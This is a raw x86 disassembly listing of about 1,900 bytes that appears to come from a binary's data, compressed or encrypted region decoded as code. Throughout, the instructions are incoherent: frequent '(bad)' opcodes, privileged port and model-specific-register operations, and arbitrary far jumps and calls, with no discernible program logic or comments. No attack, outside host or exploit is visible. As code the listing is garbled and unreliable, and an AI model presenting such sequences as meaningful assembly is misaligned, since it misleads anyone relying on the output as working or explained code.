  420cb9:	sub    edi,DWORD PTR [eax+0x3]
  420cbc:	jge    0x420c94
  420cbe:	pop    eax
  420cbf:	in     al,0x49
  420cc1:	sub    bh,BYTE PTR [eax+0x47]
  420cc4:	jle    0x420c71
  420cc6:	xchg   edx,eax
  420cc7:	popa   
  420cc8:	jo     0x420caf
  420cca:	adc    ch,BYTE PTR [edi]
  420ccc:	sbb    cl,dl
  420cce:	int3   
  420ccf:	out    dx,al
  420cd0:	ins    BYTE PTR es:[edi],dx
  420cd1:	je     0x420d28
  420cd3:	push   eax
  420cd4:	repnz fs push edi
  420cd7:	loopne 0x420cec
  420cd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cda:	push   edx
  420cdb:	inc    esp
  420cdc:	pop    ss
  420cdd:	adc    cl,BYTE PTR [edx-0xb202632]
  420ce3:	dec    esp
  420ce4:	inc    ebx
  420ce5:	adc    dl,BYTE PTR [ebx+0x5f]
  420ce8:	or     al,0xdc
  420cea:	lock rcr BYTE PTR [ecx],0x7
  420cee:	ins    BYTE PTR es:[edi],dx
  420cef:	fimul  DWORD PTR [edi-0x681a7cd]
  420cf5:	fisttp WORD PTR [ebp+0x64c2a666]
  420cfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cfc:	lds    edi,FWORD PTR [eax]
  420cfe:	pop    esi
  420cff:	inc    eax
  420d00:	gs aam 0x4a
  420d03:	xchg   ebp,eax
  420d04:	nop
  420d05:	sub    eax,DWORD PTR [edi+ebp*8]
  420d08:	adc    DWORD PTR [edx+0x0],ebx
  420d0b:	shl    dl,1
  420d0d:	fwait
  420d0e:	in     eax,dx
  420d0f:	std    
  420d10:	pop    edx
  420d11:	sub    edx,DWORD PTR [edx+0x4bf17815]
  420d17:	or     BYTE PTR [eax-0x3c],cl
  420d1a:	mov    eax,0x69456b56
  420d1f:	stc    
  420d20:	or     BYTE PTR [ebx],ah
  420d22:	or     DWORD PTR [eax-0x6f],esp
  420d25:	adc    eax,ecx
  420d27:	movsx  ebx,WORD PTR [ebx-0x7b45d968]
  420d2e:	popf   
  420d2f:	call   0x7ff5:0xe212b1b0
  420d36:	dec    ecx
  420d37:	cmp    dh,bh
  420d39:	cmp    dh,BYTE PTR [esi+0x219e2dee]
  420d3f:	xchg   edx,eax
  420d40:	xlat   BYTE PTR ds:[ebx]
  420d41:	je     0x420cd3
  420d43:	fidiv  DWORD PTR [ecx+0x4018e16c]
  420d49:	(bad)  
  420d4a:	out    0xe2,eax
  420d4c:	scas   eax,DWORD PTR es:[edi]
  420d4d:	xor    DWORD PTR [ebx-0x30],0xffffffb5
  420d51:	push   ds
  420d52:	pop    es
  420d53:	push   ebx
  420d54:	fidiv  DWORD PTR [ebx-0x6c557b38]
  420d5a:	sub    ecx,DWORD PTR [edx-0x4e03b124]
  420d60:	pop    ds
  420d61:	ins    BYTE PTR es:[edi],dx
  420d62:	jbe    0x420dbc
  420d64:	mov    ds:0x4953769,al
  420d69:	xor    eax,0xaafaa883
  420d6e:	cmovo  edi,DWORD PTR [esi+ecx*1]
  420d72:	sub    edx,esi
  420d74:	add    DWORD PTR cs:[edx+0x51],0x4f953640
  420d7c:	cwde   
  420d7d:	lea    esp,[ebx-0x70423e71]
  420d83:	push   ecx
  420d84:	and    eax,0xaca0507b
  420d89:	inc    ebx
  420d8a:	fbld   TBYTE PTR [ebp-0x64]
  420d8d:	or     ebx,ebp
  420d8f:	push   esp
  420d90:	sub    BYTE PTR [eax-0x2632326f],0xe4
  420d97:	fwait
  420d98:	js     0x420dc5
  420d9a:	pusha  
  420d9b:	lods   al,BYTE PTR ds:[esi]
  420d9c:	mov    ds:0x2d18298e,eax
  420da1:	xor    eax,0xfc1b42db
  420da6:	cmp    ah,bh
  420da8:	repnz or BYTE PTR [ebx],ch
  420dab:	mov    DWORD PTR [ebx-0x69],ebx
  420dae:	clc    
  420daf:	add    DWORD PTR [eax+0x5598c5a2],eax
  420db5:	sahf   
  420db6:	pushf  
  420db7:	mov    ebx,0x3641d48c
  420dbc:	repz add BYTE PTR [ecx+ecx*1+0x73],cl
  420dc1:	push   ss
  420dc2:	mov    edx,0xdeda1486
  420dc7:	cmp    DWORD PTR [ebp+esi*2+0x2ff441c9],ebx
  420dce:	lods   eax,DWORD PTR ds:[esi]
  420dcf:	pop    edi
  420dd0:	jae    0x420dc2
  420dd2:	stos   BYTE PTR es:[edi],al
  420dd3:	iret   
  420dd4:	mov    edi,0xbedb34ea
  420dd9:	xchg   edi,eax
  420dda:	adc    eax,0xa009eb2c
  420ddf:	popa   
  420de0:	jl     0x420d6b
  420de2:	loop   0x420d8e
  420de4:	stc    
  420de5:	ret    0xf0fb
  420de8:	(bad)  
  420dea:	mov    ch,0x5e
  420dec:	push   edx
  420ded:	adc    ebx,DWORD PTR [esp+ecx*4+0x48bbac59]
  420df4:	jp     0x420e72
  420df6:	arpl   WORD PTR [edx],sp
  420df8:	aaa    
  420df9:	push   0x93c67c7b
  420dfe:	mov    dl,0x8a
  420e00:	jmp    eax
  420e02:	retf   0xa13d
  420e05:	and    eax,0xdc542790
  420e0a:	adc    ebp,DWORD PTR [esi]
  420e0c:	scas   eax,DWORD PTR es:[edi]
  420e0d:	xor    edx,DWORD PTR [edi-0x186cf189]
  420e13:	(bad)  
  420e14:	mov    bh,0xa5
  420e16:	mov    WORD PTR [esi],?
  420e18:	into   
  420e19:	xchg   BYTE PTR [eax],bl
  420e1b:	push   esp
  420e1c:	jp     0x420da2
  420e1e:	sbb    eax,0xd8b413b4
  420e23:	je     0x420e40
  420e25:	inc    bh
  420e27:	or     cl,BYTE PTR [bp+0x3f5d]
  420e2c:	inc    esi
  420e2d:	or     esp,DWORD PTR [edx+0x48]
  420e30:	dec    edx
  420e31:	fild   DWORD PTR [ebx]
  420e33:	loope  0x420e8a
  420e35:	cli    
  420e36:	mov    bh,0xb0
  420e38:	sub    BYTE PTR [edx],ah
  420e3a:	xchg   ebp,eax
  420e3b:	leave  
  420e3c:	pop    esi
  420e3d:	mov    ecx,0x52f4297d
  420e42:	lahf   
  420e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e44:	fisttp DWORD PTR [eax-0x6e]
  420e47:	(bad)  
  420e49:	enter  0xaef4,0xfe
  420e4d:	jmp    0x26aa:0x158c6fd2
  420e54:	std    
  420e55:	adc    DWORD PTR [edx+0x35f2f77a],esp
  420e5b:	and    al,0x62
  420e5d:	or     BYTE PTR [ecx-0x2adf6503],0x30
  420e64:	pushf  
  420e65:	rcr    BYTE PTR [edx-0x54452ad6],1
  420e6b:	xchg   edx,eax
  420e6c:	or     eax,DWORD PTR [ebx-0x2ba0f42a]
  420e72:	push   esi
  420e73:	cmp    eax,esp
  420e75:	mov    eax,ds:0x97a01ee8
  420e7a:	sbb    eax,0x9f193e
  420e7f:	les    ecx,FWORD PTR [esi+0x15]
  420e82:	arpl   di,si
  420e84:	inc    esp
  420e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e86:	es pop esi
  420e88:	dec    eax
  420e89:	enter  0xdbe9,0xbb
  420e8d:	xchg   esi,eax
  420e8e:	jb     0x420e70
  420e90:	repnz retf 0x4b03
  420e94:	fild   WORD PTR [esp+esi*4-0xa]
  420e98:	ins    BYTE PTR es:[edi],dx
  420e99:	adc    BYTE PTR [ecx+0x20],ah
  420e9c:	int3   
  420e9d:	imul   esi,DWORD PTR [esi*2+0x288265a3],0x19b36cef
  420ea8:	mov    ebp,0xd8900b1b
  420ead:	xor    dl,BYTE PTR ds:0x38ce0a14
  420eb3:	sub    ebx,DWORD PTR [ebx]
  420eb5:	sbb    DWORD PTR [ebp+0xebad610],0x1b
  420ebc:	or     edi,DWORD PTR [edi]
  420ebe:	pop    edx
  420ebf:	scas   eax,DWORD PTR es:[edi]
  420ec0:	aam    0x29
  420ec2:	iret   
  420ec3:	pop    edx
  420ec4:	pop    eax
  420ec5:	xlat   BYTE PTR ds:[ebx]
  420ec6:	je     0x420f35
  420ec8:	int    0xe1
  420eca:	das    
  420ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420ecc:	retf   0x7d48
  420ecf:	sub    eax,0x22ed48e
  420ed4:	xlat   BYTE PTR ds:[ebx]
  420ed5:	and    al,0xcf
  420ed7:	in     eax,dx
  420ed8:	outs   dx,DWORD PTR ds:[esi]
  420ed9:	add    BYTE PTR [edi-0x4d],0x9f
  420edd:	pop    edx
  420ede:	dec    ebx
  420edf:	sub    eax,0x4e8f58df
  420ee4:	fwait
  420ee5:	test   DWORD PTR [eax+0x58],esp
  420ee8:	pop    eax
  420ee9:	pop    ss
  420eea:	push   ss
  420eeb:	lahf   
  420eec:	add    BYTE PTR [edx],0x9c
  420eef:	cmp    ebx,DWORD PTR [edi+edi*2-0x3ffd4c17]
  420ef6:	inc    esp
  420ef7:	(bad)  
  420ef8:	xchg   ebx,eax
  420ef9:	scas   eax,DWORD PTR es:[edi]
  420efa:	xor    al,0xc1
  420efc:	push   es
  420efd:	xchg   ebx,eax
  420efe:	(bad)  
  420eff:	(bad)  
  420f01:	iret   
  420f02:	les    esi,FWORD PTR [ecx]
  420f04:	lahf   
  420f05:	ret    
  420f06:	mov    dh,0x3b
  420f08:	outs   dx,BYTE PTR ds:[esi]
  420f09:	fs ret 
  420f0b:	aas    
  420f0c:	mov    edx,0xeba10907
  420f11:	inc    edx
  420f12:	push   esp
  420f13:	and    al,0x3
  420f15:	xchg   edi,eax
  420f16:	in     al,0x1d
  420f18:	ret    
  420f19:	pushaw 
  420f1b:	lods   eax,DWORD PTR ds:[esi]
  420f1c:	pop    es
  420f1d:	bsr    eax,DWORD PTR ds:0xdf9ade22
  420f24:	sti    
  420f25:	popa   
  420f26:	mov    ds:0xc42b0652,al
  420f2b:	sbb    eax,0x1f30a140
  420f30:	adc    esp,DWORD PTR [ecx+0x7a]
  420f33:	rcl    BYTE PTR [eax-0x2b588fca],cl
  420f39:	sbb    ecx,ebx
  420f3b:	dec    ebp
  420f3c:	fwait
  420f3d:	xor    cl,BYTE PTR [ebp-0xa]
  420f40:	sub    al,0x80
  420f42:	es inc edx
  420f44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f45:	js     0x420f28
  420f47:	jns    0x420f1f
  420f49:	add    bh,BYTE PTR [edx]
  420f4b:	loopne 0x420f0d
  420f4d:	inc    eax
  420f4e:	adc    edi,esi
  420f50:	sub    dh,BYTE PTR [ecx]
  420f52:	mov    cx,0xa50b
  420f56:	repnz xchg ebx,eax
  420f58:	wrmsr  
  420f5a:	inc    esp
  420f5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f5c:	add    esi,DWORD PTR [ebp-0x54]
  420f5f:	or     BYTE PTR [ebp-0x77],al
  420f62:	mov    eax,ds:0x2aea21ca
  420f67:	mov    eax,ebx
  420f69:	test   al,0x7
  420f6b:	fisub  DWORD PTR [edx-0x2291c4ce]
  420f71:	sub    al,0x5f
  420f73:	pushf  
  420f74:	jo     0x420f19
  420f76:	(bad)  
  420f77:	xlat   BYTE PTR ds:[ebx]
  420f78:	loopne 0x420f5c
  420f7a:	inc    edx
  420f7b:	fst    QWORD PTR [ecx]
  420f7d:	push   ebx
  420f7e:	cmp    eax,0x49c057d4
  420f83:	mov    dh,BYTE PTR [esi+ebx*8-0x50748ca8]
  420f8a:	call   0xa7d34a3d
  420f8f:	sbb    esi,DWORD PTR ds:0xefec57dc
  420f95:	push   ds
  420f96:	(bad)  [ecx]
  420f98:	pop    edi
  420f99:	dec    esp
  420f9a:	dec    ebx
  420f9b:	or     eax,0x7435c32d
  420fa0:	test   DWORD PTR [edx+0x700bf370],ebx
  420fa6:	push   es
  420fa7:	repz mov ebx,0xf1ff1566
  420fad:	mov    dl,0x35
  420faf:	in     eax,0xf2
  420fb1:	pop    ds
  420fb2:	in     al,0xb6
  420fb4:	pop    eax
  420fb5:	clc    
  420fb6:	outs   dx,DWORD PTR ds:[esi]
  420fb7:	aam    0x9e
  420fb9:	test   DWORD PTR [esi-0x14],ebp
  420fbc:	out    0xc4,eax
  420fbe:	adc    eax,eax
  420fc0:	adc    DWORD PTR [edi+0x47],edx
  420fc3:	jge    0x420fba
  420fc5:	cli    
  420fc6:	pushf  
  420fc7:	mov    ebp,0xd6deaa17
  420fcc:	and    al,0x27
  420fce:	dec    edi
  420fcf:	sub    edx,eax
  420fd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fd2:	xchg   esp,eax
  420fd3:	push   edi
  420fd4:	(bad)  
  420fd6:	inc    edi
  420fd7:	imul   esp,DWORD PTR [ecx],0xffffffec
  420fda:	xchg   edx,eax
  420fdb:	shl    DWORD PTR [ecx-0x44d94507],0x40
  420fe2:	add    eax,DWORD PTR ds:0x397fa7b6
  420fe8:	cli    
  420fe9:	add    eax,0xc8675b86
  420fee:	ins    DWORD PTR es:[edi],dx
  420fef:	sub    eax,0x9036828d
  420ff4:	and    eax,0xb4e218c8
  420ff9:	mov    al,ss:0xe16de907
  420fff:	push   ecx
  421000:	outs   dx,DWORD PTR ds:[esi]
  421001:	popf   
  421002:	cld    
  421003:	in     eax,dx
  421004:	lahf   
  421005:	push   ss
  421006:	mov    cl,0xef
  421008:	sbb    BYTE PTR [eax+0x74520650],ah
  42100e:	hlt    
  42100f:	sub    BYTE PTR [eax-0x33f1b830],cl
  421015:	lahf   
  421016:	dec    edi
  421017:	retf   0x7855
  42101a:	or     eax,0xf26227ea
  42101f:	adc    BYTE PTR [ebp-0x72],cl
  421022:	ds inc esp
  421024:	dec    edx
  421025:	and    dl,BYTE PTR [edx+0x7cc2dcb4]
  42102b:	push   0x75
  42102d:	gs dec edx
  42102f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421030:	pop    esi
  421031:	ror    DWORD PTR [ecx+0x12],cl
  421034:	loopne 0x421081
  421036:	mov    BYTE PTR [eax],dh
  421038:	and    DWORD PTR ds:0x3d58b8a6,eax
  42103e:	aaa    
  42103f:	pop    edi
  421040:	outs   dx,BYTE PTR ds:[esi]
  421041:	popf   
  421042:	inc    eax
  421043:	jmp    DWORD PTR [esi]
  421045:	pop    ebx
  421046:	ds pop cx
  421049:	lea    esi,[ebp+eiz*4-0x7]
  42104d:	or     eax,DWORD PTR [ebp-0x5c5572e6]
  421053:	in     eax,0xb8
  421055:	ret    
  421056:	dec    ebp
  421057:	adc    DWORD PTR [ecx+0x56],ebp
  42105a:	push   ss
  42105b:	dec    edx
  42105c:	in     al,dx
  42105d:	push   esp
  42105e:	push   es
  42105f:	mov    cl,0x39
  421061:	hlt    
  421062:	mov    dl,0x31
  421064:	xor    eax,0x9c2aa0c4
  421069:	adc    esp,DWORD PTR [ebx+0x46]
  42106c:	dec    esp
  42106d:	ds cld 
  42106f:	aad    0x0
  421071:	or     al,0x8f
  421073:	add    ch,BYTE PTR [ebx]
  421075:	ins    BYTE PTR es:[edi],dx
  421076:	pusha  
  421077:	lahf   
  421078:	gs popf 
  42107a:	sbb    eax,0x4363cbe5
  42107f:	inc    edx
  421080:	gs loope 0x4210c7
  421083:	mov    edi,0x53130b22
  421088:	loop   0x421050
  42108a:	daa    
  42108b:	pop    es
  42108c:	nop
  42108d:	retf   0x8781
  421090:	ds inc edx
  421092:	inc    esi
  421093:	jnp    0x4210e2
  421095:	test   eax,0xc38a4423
  42109a:	daa    
  42109b:	pusha  
  42109c:	pop    ebp
  42109d:	jae    0x4210d0
  42109f:	popa   
  4210a0:	std    
  4210a1:	dec    ecx
  4210a2:	shr    BYTE PTR [edi],cl
  4210a4:	in     al,0xcc
  4210a6:	jae    0x421126
  4210a8:	and    BYTE PTR [esi-0x4a2eab9c],0x9f
  4210af:	das    
  4210b0:	adc    al,0xb4
  4210b2:	mov    eax,0x8129a553
  4210b7:	cmp    DWORD PTR [ecx-0x58],ecx
  4210ba:	and    al,0xc2
  4210bc:	mov    esp,0x9ed3b384
  4210c1:	lods   eax,DWORD PTR ds:[esi]
  4210c2:	mov    ebx,0x60b244b4
  4210c7:	stos   DWORD PTR es:[edi],eax
  4210c8:	test   BYTE PTR [ecx-0x7a183ce1],dh
  4210ce:	enter  0x1bd6,0x8b
  4210d2:	aaa    
  4210d3:	mov    dl,cl
  4210d5:	sub    eax,0x29f66cb9
  4210da:	pop    esp
  4210db:	push   cs
  4210dc:	cmp    ebp,DWORD PTR [edx-0x1ff26d9c]
  4210e2:	push   edi
  4210e3:	push   ds
  4210e4:	push   esi
  4210e5:	aad    0x0
  4210e7:	test   al,0xb6
  4210e9:	sar    DWORD PTR [ebx-0x7124abf5],cl
  4210ef:	test   DWORD PTR [edi],esi
  4210f1:	pusha  
  4210f2:	mov    cl,0x4b
  4210f4:	fdiv   DWORD PTR [ebx+0x27]
  4210f7:	cmc    
  4210f8:	fisubr DWORD PTR [eax+0xc7e4176]
  4210fe:	popf   
  4210ff:	out    dx,eax
  421100:	jmp    0xa05a:0xaa1fc6b9
  421107:	les    ebp,FWORD PTR [edi+0xc]
  42110a:	popa   
  42110b:	mov    al,0xe2
  42110d:	int3   
  42110e:	dec    ebp
  42110f:	push   esi
  421110:	stc    
  421111:	ror    DWORD PTR [eax-0xc865ba8],cl
  421117:	mov    bl,BYTE PTR [ecx]
  421119:	xchg   edx,eax
  42111a:	mov    eax,ds:0xabef332e
  42111f:	loop   0x4210f6
  421121:	dec    esi
  421122:	rcr    DWORD PTR [esi],cl
  421124:	fst    st(2)
  421126:	dec    ebx
  421127:	retf   
  421128:	fwait
  421129:	pop    eax
  42112a:	lds    eax,FWORD PTR ds:0x6b4c8328
  421130:	adc    al,0x3b
  421132:	lods   al,BYTE PTR ds:[esi]
  421133:	mov    edi,0x5be5cdf0
  421138:	and    eax,0x685413b7
  42113d:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42113f:	push   cs
  421140:	sub    eax,0xac5e1107
  421145:	and    BYTE PTR [edi-0x1f],al
  421148:	pop    ecx
  421149:	cmp    ah,ch
  42114b:	push   edx
  42114c:	push   0xffffffed
  42114e:	pop    es
  42114f:	lds    ebx,FWORD PTR [ebx+0x78]
  421152:	shr    DWORD PTR [ebx-0x7b],cl
  421155:	mov    eax,ds:0xb56046d1
  42115a:	mov    bl,0x5e
  42115c:	and    al,0x89
  42115e:	mov    fs,WORD PTR [edi-0x616539a0]
  421164:	mov    esp,0xdaccc40f
  421169:	cmc    
  42116a:	jnp    0x42119b
  42116c:	add    al,0xa3
  42116e:	retf   0xba73
  421171:	in     eax,dx
  421172:	mov    eax,DWORD PTR [esi]
  421174:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421175:	mov    BYTE PTR [ecx+0x76],al
  421178:	mov    eax,ds:0x922744ed
  42117d:	scas   eax,DWORD PTR es:[edi]
  42117e:	mov    al,BYTE PTR [eax-0x3e]
  421181:	ss sbb al,0xa0
  421184:	aam    0xf7
  421186:	hlt    
  421187:	adc    eax,0x73b38d19
  42118c:	push   ebp
  42118d:	fisub  DWORD PTR [edi]
  42118f:	mov    BYTE PTR [eax+0x51],0x76
  421193:	pop    ebx
  421194:	retf   
  421195:	cmp    al,0x38
  421197:	addr16 mov edx,0xbc32d41
  42119d:	mov    esp,ebx
  42119f:	mov    dl,0x24
  4211a1:	sbb    al,0x60
  4211a3:	pop    ecx
  4211a4:	shl    cl,1
  4211a6:	(bad)  
  4211a7:	mov    dl,0x1b
  4211a9:	inc    ebp
  4211aa:	leave  
  4211ab:	fadd   QWORD PTR [ecx*8+0x2cbfa580]
  4211b2:	mov    BYTE PTR [eax+0x3b],bl
  4211b5:	push   edx
  4211b6:	shl    BYTE PTR [ebx-0x92fab0e],0x1b
  4211bd:	push   ds
  4211be:	test   BYTE PTR [ebx-0x4f],ah
  4211c1:	ss cli 
  4211c3:	add    al,0x66
  4211c5:	lods   eax,DWORD PTR ds:[esi]
  4211c6:	inc    ecx
  4211c7:	xchg   ebx,eax
  4211c8:	iret   
  4211c9:	mov    BYTE PTR [edi],bh
  4211cb:	sub    al,0xb1
  4211cd:	int    0x28
  4211cf:	mov    eax,ds:0x66b557b8
  4211d4:	xchg   BYTE PTR [edi+0x16d7260],dl
  4211da:	sub    cl,BYTE PTR [edx+0x6]
  4211dd:	add    eax,0x65dedad4
  4211e2:	mov    cl,0x65
  4211e4:	jb     0x421208
  4211e6:	retf   
  4211e7:	adc    eax,0xbba54239
  4211ec:	pop    edx
  4211ed:	and    BYTE PTR [esi+0x69f8f174],bl
  4211f3:	jne    0x4211d1
  4211f5:	xor    al,0xaf
  4211f7:	jmp    0x16f9824f
  4211fc:	push   edi
  4211fd:	ror    DWORD PTR [edx-0x6e40f84e],cl
  421203:	fucomp st(0)
  421205:	mov    bh,0x29
  421207:	jmp    0xcec0:0x35cc20b6
  42120e:	fstp   QWORD PTR [edx+0x68]
  421211:	add    BYTE PTR es:[edi+0x5a9860ab],bl
  421218:	rcl    bh,cl
  42121a:	pop    ebp
  42121b:	sub    dh,ah
  42121d:	inc    esp
  42121e:	shl    DWORD PTR [ecx],cl
  421220:	sti    
  421221:	pop    ss
  421222:	xchg   esi,eax
  421223:	ja     0x42126a
  421225:	lahf   
  421226:	clc    
  421227:	inc    ebx
  421228:	inc    edx
  421229:	push   0xffffffa0
  42122b:	cmp    DWORD PTR [edx],esp
  42122d:	(bad)  
  42122e:	test   al,0x1e
  421230:	(bad)  
  421231:	push   ds
  421232:	sbb    eax,0x81dd465e
  421237:	cwde   
  421238:	je     0x42129e
  42123a:	ins    BYTE PTR es:[edi],dx
  42123b:	test   DWORD PTR [ecx-0x1e],ebp
  42123e:	mov    ebp,0x33b071f1
  421243:	push   esi
  421244:	jns    0x42126f
  421246:	dec    edx
  421247:	dec    ebx
  421248:	pop    edi
  421249:	lock ficomp DWORD PTR [edi-0x47]
  42124d:	xor    BYTE PTR [ecx+edi*1-0x63ec3c63],0x51
  421255:	dec    esp
  421256:	xlat   BYTE PTR ds:[ebx]
  421257:	loopne 0x421203
  421259:	dec    esp
  42125a:	(bad)  
  42125b:	push   eax
  42125c:	pop    ecx
  42125d:	js     0x4211e9
  42125f:	das    
  421260:	(bad)  
  421261:	cs ja  0x421298
  421264:	mov    ebx,0x335b48a3
  421269:	mov    edx,DWORD PTR [ecx+0x546f82ea]
  42126f:	push   0x9e3c0f8a
  421274:	mov    al,0xe7
  421276:	call   0x717fadef
  42127b:	jg     0x4212e6
  42127d:	in     al,0x62
  42127f:	mov    al,0xb5
  421281:	ret    0x692f
  421284:	ret    
  421285:	push   esp
  421286:	cli    
  421287:	popa   
  421288:	mov    bh,0xe1
  42128a:	mov    bl,0x4f
  42128c:	cdq    
  42128d:	push   eax
  42128e:	adc    eax,0x905b9314
  421293:	(bad)  
  421294:	stc    
  421295:	loopne 0x42128a
  421297:	mov    bh,0xe6
  421299:	sti    
  42129a:	mov    al,BYTE PTR [ecx]
  42129c:	cwde   
  42129d:	sbb    al,0x4e
  42129f:	outs   dx,DWORD PTR ds:[esi]
  4212a0:	cmp    eax,0x1e55043b
  4212a5:	xchg   edi,eax
  4212a6:	repnz and ecx,DWORD PTR [edx+0x6c4b047d]
  4212ad:	cmc    
  4212ae:	and    dl,ah
  4212b0:	mov    dh,0x34
  4212b2:	add    al,0x3d
  4212b4:	data16 sbb al,0xed
  4212b7:	mov    edx,0xd1393ddd
  4212bc:	pop    eax
  4212bd:	push   ebp
  4212be:	fimul  WORD PTR [edi]
  4212c0:	inc    esi
  4212c1:	loop   0x4212c0
  4212c3:	inc    ebx
  4212c4:	sbb    al,dl
  4212c6:	xchg   BYTE PTR [ebx],ah
  4212c8:	in     al,0x3d
  4212ca:	jne    0x421263
  4212cc:	cmp    BYTE PTR [esi+esi*4-0x5bfdf213],ch
  4212d3:	sbb    edx,DWORD PTR [esi]
  4212d5:	push   ecx
  4212d6:	jo     0x4212ec
  4212d8:	js     0x4212af
  4212da:	push   esp
  4212db:	push   bx
  4212dd:	lods   eax,DWORD PTR ds:[esi]
  4212de:	fnstenv [edx]
  4212e0:	jecxz  0x4212aa
  4212e2:	pop    ds
  4212e3:	ja     0x4212d9
  4212e5:	jge    0x421287
  4212e7:	leave  
  4212e8:	pop    ebx
  4212e9:	popa   
  4212ea:	int3   
  4212eb:	popa   
  4212ec:	sahf   
  4212ed:	mov    WORD PTR [edx],?
  4212ef:	icebp  
  4212f0:	add    DWORD PTR [ecx+0x4a],eax
  4212f3:	pop    ecx
  4212f4:	jp     0x421310
  4212f6:	ins    DWORD PTR es:[edi],dx
  4212f7:	aam    0xbe
  4212f9:	mov    ds,WORD PTR [esi]
  4212fb:	lods   eax,DWORD PTR ds:[esi]
  4212fc:	cwde   
  4212fd:	(bad)  
  4212fe:	adc    BYTE PTR [ebx-0x29af44b4],ah
  421304:	in     al,dx
  421305:	fstp   TBYTE PTR [esi]
  421307:	daa    
  421308:	iret   
  421309:	or     DWORD PTR [esi+0x7451bcb8],esp
  42130f:	jb     0x421340
  421311:	xchg   edi,eax
  421312:	mov    ebp,DWORD PTR [ecx+0x64]
  421315:	lods   al,BYTE PTR gs:[esi]
  421317:	ret    0xaf14
  42131a:	test   BYTE PTR [edi+0x25],bh
  42131d:	outs   dx,BYTE PTR ds:[esi]
  42131e:	xlat   BYTE PTR ds:[ebx]
  42131f:	mov    eax,ds:0xa4a08dcb
  421324:	pop    ds
  421325:	iret   
  421326:	adc    al,0x80
  421328:	mov    ecx,0xed260d88
  42132d:	or     al,0xd1
  42132f:	dec    ebp
  421330:	mov    ds:0xcb14b985,al
  421335:	cmp    DWORD PTR [eax-0x3bf45db5],edi
  42133b:	inc    ebx
  42133c:	mov    dl,0xe9
  42133e:	in     eax,dx
  42133f:	mov    cl,0x21
  421341:	popf   
  421342:	add    dh,al
  421344:	inc    edi
  421345:	sbb    ecx,DWORD PTR [edx-0x2]
  421348:	xor    al,0xe2
  42134a:	xchg   esp,eax
  42134b:	loope  0x421371
  42134d:	fbstp  TBYTE PTR [esi+0xf]
  421350:	stc    
  421351:	cmp    bl,BYTE PTR [ebp+0x34]
  421354:	mov    ?,WORD PTR [edx-0x2cb9395d]
  42135a:	ja     0x42131f
  42135c:	mov    edx,0x3a22046c
  421361:	addr16 loop 0x421351
  421364:	mov    ebx,0x1384ebee
  421369:	pop    ebx
  42136a:	(bad)
  42136d:	xchg   edx,esi
  42136f:	push   edi
  421370:	inc    edx
  421371:	sub    DWORD PTR [edi+esi*2+0x1bd8429],ecx
  421378:	push   ss
  421379:	in     al,0x2e
  42137b:	and    BYTE PTR [ebx],0xea
  42137e:	push   ds
  42137f:	loop   0x4213ea
  421381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421382:	inc    edi
  421383:	fst    QWORD PTR [edi+0x25]
  421386:	pop    ebp
  421387:	dec    esp
  421388:	xchg   ebp,eax
  421389:	add    eax,0xb1736784
  42138e:	pop    sp
  421390:	adc    DWORD PTR [ebp-0x5b3db899],ebp
  421396:	js     0x421376
  421398:	push   esp
  421399:	cwde   
  42139a:	sbb    BYTE PTR [ecx+ebp*8-0x31],bh
  42139e:	loop   0x42133c
  4213a0:	in     eax,dx
  4213a1:	mov    ds:0x3e70d856,al
  4213a6:	add    BYTE PTR [esi+0x36715f74],0xec
  4213ad:	and    al,0x7c
  4213af:	jge    0x421374
  4213b1:	rcl    esp,cl
  4213b3:	xor    esp,DWORD PTR ds:0x9e5d90bf
  4213b9:	mov    esi,0x3396a454
  4213be:	inc    ebp
  4213bf:	mov    bl,dl
  4213c1:	mov    ebx,0x8fd1139
  4213c6:	inc    eax
  4213c7:	xchg   esp,eax
  4213c8:	add    ah,bl
  4213ca:	mov    bh,0xa5
  4213cc:	lods   eax,DWORD PTR ds:[esi]
  4213cd:	xor    DWORD PTR [ebx],eax
  4213cf:	inc    edx
  4213d0:	dec    esi
  4213d1:	inc    ebx
  4213d2:	mov    WORD PTR [eax],ss
  4213d4:	mov    esi,0x77371f5f
  4213d9:	mov    ds:0xa7100b04,al
  4213de:	mov    ch,0xe6
  4213e0:	adc    edi,ebx
  4213e2:	int3   
  4213e3:	xchg   esp,eax
  4213e4:	adc    BYTE PTR [ebx],ah
  4213e6:	pop    ss
  4213e7:	jne    0x42137d
  4213e9:	xlat   BYTE PTR ds:[ebx]
  4213ea:	push   es
  4213eb:	xchg   edi,eax
  4213ec:	push   esp
  4213ed:	pop    ebp
  4213ee:	les    ebp,FWORD PTR [edi-0x1c]
  4213f1:	les    ebx,FWORD PTR [ebx+0x251e9251]
  4213f7:	in     eax,0xbd
  4213f9:	push   esi
  4213fa:	xchg   ecx,eax
  4213fb:	popa   
  4213fc:	loop   0x4213b4
  4213fe:	leave  
  4213ff:	sbb    DWORD PTR [esi-0xa05dc54],edi
  421405:	mov    ds:0xb5e7a2de,al
  42140a:	ret    
  42140b:	or     al,0x8d
  42140d:	cli    
  42140e:	mov    dl,0x7
  421410:	sub    ebx,DWORD PTR [esi]
  421412:	push   ebp
  421413:	mov    dh,0x2d
  421415:	scas   al,BYTE PTR es:[edi]
  421416:	mov    al,ds:0x377728ab
  42141b:	jecxz  0x4213bc
  42141d:	retf   0x6f6e
  421420:	je     0x421464
  421422:	inc    esi
  421423:	xchg   dh,bl
  421425:	inc    esp
  421426:	out    dx,eax
  421427:	popf   
  421428:	jbe    0x4213dd
  42142a:	scas   eax,DWORD PTR es:[edi]
  42142b:	dec    ebp
  42142c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42142d:	add    dl,BYTE PTR [edx]
  42142f:	pop    esi
  421430:	inc    edx
  421431:	test   DWORD PTR ds:0x41e4f947,0x7b0ed7fc
  42143b:	out    0x59,eax
  42143d:	popa   
  42143e:	ins    DWORD PTR es:[edi],dx
